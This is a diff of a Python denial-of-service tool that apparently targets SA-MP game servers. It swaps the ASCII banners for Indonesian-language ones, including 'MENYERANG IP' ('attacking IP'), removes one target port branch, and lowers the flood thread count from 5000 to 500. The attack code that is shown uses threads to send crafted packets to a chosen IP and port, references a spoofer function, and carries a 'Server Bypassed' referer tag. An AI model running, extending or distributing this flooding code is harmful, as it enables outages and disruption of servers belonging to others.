@@ -55,15 +55,13 @@ referers = [
      'Your_Server_Bypassed_By_Grizzly']
 
 os.system("clear")
-print ("\033[35m                      ╔════════════════════════════════════╗")
-print ("\033[35m                      ║\033[31m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\033[35m  ║")
-print ("\033[35m                      ║\033[31m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \033[35m  ║")
-print ("\033[35m                      ║\033[31m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \033[35m  ║")
-print ("\033[35m                      ╚════════════════════════════════════╝")
 print ("\033[31m                   ╔════════════════════╦══════════════════════╗")                 
-print ("\033[31m                   ║\033[32m UDP/TCP/SAMP ATTACK     \033[31m ║ \033[32m  REMAKE CODES BY Grizzly   \033[31m║")
+print ("\033[31m                   ║\033[31m                              Grizzly Nih Dek                                  \033[31m║")
 print ("\033[31m                   ╚═══════════════════╦╩╦═════════════════════╝")
-print ("\033[31m             ATTACK TO IP \033[36m%s \033[31m║ ║\033[31m  AND ATTACK TO PORT \033[36m%s"%(ip,port))                                    
+print ("\033[31m                   ╔════════════════════╦══════════════════════╗")                 
+print ("\033[31m                   ║\033[32m            REMAKE CODES BY GrizzlyySamp                 \033[31m║")
+print ("\033[31m                   ╚═══════════════════╦╩╦═════════════════════╝")
+print ("\033[31m             MENYERANG IP \033[36m%s \033[31m║ ║\033[31m  DENGAN PORT \033[36m%s"%(ip,port))                                    
 
 
 def spoofer():
@@ -105,14 +103,12 @@ class MyThread(threading.Thread):
             elif int(port) == 7771:
                 sock.sendto(Pacotes[6], (ip, int(port)))
             elif int(port) == 7784:
-                sock.sendto(Pacotes[7], (ip, int(port)))
-            elif(int(port) == 1111):
-                sock.sendto(Pacotes[9], (ip, int(port)))
+                sock.sendto(Pacotes[7], (ip, int(port))) 
 
 
 if __name__ == '__main__':
     try:
-        for x in range(5000):
+        for x in range(500):
             mythread = MyThread()
             mythread.start()
             time.sleep(.1)
@@ -120,9 +116,7 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear')
         print ("╔════════════════════════════════════╗")
-        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
-        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
-        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
+        print ("                                         Down Gk Bang?                                            ")
         print ("╚════════════════════════════════════╝")
         print ('\n\n')
         print ('STOP TO ATTACK {}').format(orgip)
